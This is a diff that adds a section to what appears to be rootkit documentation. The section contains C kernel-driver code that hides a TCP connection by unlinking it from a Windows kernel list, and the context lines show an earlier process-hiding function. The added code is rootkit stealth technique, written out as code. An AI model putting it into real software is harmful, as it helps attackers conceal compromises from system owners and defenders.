@@ -220,3 +220,31 @@ public static bool HideProcess(int pid)
     return false;
 }
 ```
+
+### Kernel-Mode Operations
+
+The rootkit components leverage Windows kernel structures to achieve stealth:
+
+```c
+// Kernel-mode driver code for TCP connection hiding
+NTSTATUS HideTcpConnection(PVOID connectionObject)
+{
+    PLIST_ENTRY listEntry;
+    
+    // Get the TCP connection list entry
+    listEntry = (PLIST_ENTRY)((ULONG_PTR)connectionObject + TCP_CONN_LIST_OFFSET);
+    
+    // Remove from the doubly-linked list
+    if (listEntry->Flink != NULL && listEntry->Blink != NULL)
+    {
+        listEntry->Flink->Blink = listEntry->Blink;
+        listEntry->Blink->Flink = listEntry->Flink;
+        
+        // Clear the pointers
+        listEntry->Flink = listEntry->Blink = listEntry;
+        return STATUS_SUCCESS;
+    }
+    
+    return STATUS_UNSUCCESSFUL;
+}
+```
